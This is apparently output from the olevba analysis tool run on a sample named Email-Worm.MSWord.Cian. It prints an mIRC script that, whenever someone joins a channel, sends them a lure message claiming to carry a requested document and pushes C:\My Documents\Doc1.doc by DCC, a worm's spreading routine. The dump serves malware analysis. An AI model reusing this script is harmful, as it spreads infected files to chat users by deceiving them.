olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Email-Worm.MSWord.Cian
Type: Text
-------------------------------------------------------------------------------
VBA MACRO ./Email-Worm.MSWord.Cian 
in file: ./Email-Worm.MSWord.Cian - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[script]
n5= on 1:JOIN:#:{
n6= /if ( $nick == $me ) { halt }
n7= /msg $nick Here is the document U wanted from me! :)
n8= /dcc send -c $nick C:\My Documents\Doc1.doc
n9= }
No suspicious keyword or IOC found.

